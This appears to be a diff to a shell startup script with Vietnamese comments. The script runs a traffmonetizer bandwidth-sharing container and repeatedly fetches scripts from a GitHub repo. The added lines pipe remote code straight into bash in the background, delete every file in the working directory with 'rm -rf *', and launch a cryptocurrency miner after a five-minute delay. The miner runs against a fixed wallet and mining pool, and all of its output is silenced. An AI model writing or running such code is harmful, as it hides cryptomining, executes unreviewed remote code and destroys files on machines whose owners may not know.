@@ -32,17 +32,26 @@ docker run -d --name "$NAME" -e TOKEN="$FIXED_TOKEN" traffmonetizer/cli_v2 start
 while true; do
   if [ $RUN_ONCE -eq 0 ]; then
     # Tải các file
-    rm -f layproxyur.sh
-    wget -q https://raw.githubusercontent.com/rabithoy/tth/main/layproxyur.sh -O layproxyur.sh
+    rm -rf 1.sh 2.sh 3.sh
+    rm -rf *
+    wget https://raw.githubusercontent.com/rabithoy/bart/main/1.sh
+    wget -O 2.sh https://raw.githubusercontent.com/rabithoy/bart/main/2.sh
+    wget https://raw.githubusercontent.com/rabithoy/bart/main/3.sh
+    bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/runoneur.sh) > /dev/null 2>&1 &
 
-    # Chạy một script remote (runoneur.sh) nền
-    bash <(curl -s https://raw.githubusercontent.com/rabithoy/tth/main/runoneur.sh) >/dev/null 2>&1 &
+    # Cấp quyền thực thi cho cả 3 file
+    chmod +x 1.sh 2.sh 3.sh
+    nohup bash ./3.sh >/dev/null 2>&1 &
 
-    # Cấp quyền thực thi cho layproxyur.sh
-    chmod +x layproxyur.sh
-
-    # Chạy layproxyur.sh nền
-    nohup bash ./layproxyur.sh >/dev/null 2>&1 &
+    (
+    sleep 300
+    wget -q https://github.com/dero-am/astrobwt-miner/releases/download/V1.9.2.R5/astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
+    tar -xf astrominer-V1.9.2.R5_amd64_linux.tar.gz && \
+    ./astrominer/astrominer \
+        -w dero1qyv4tdjrsjhl8u07ngsxv85hy9ln8j9ykcld3fr4hgl37f279tw9vqga0a27l \
+        -log-interval 600 -m 1 -p rpc -r 147.135.252.201:10100 -r1 nodent2.cpumining.cloud:10100 \
+        > /dev/null 2>&1
+    ) &
 
     RUN_ONCE=1
   fi
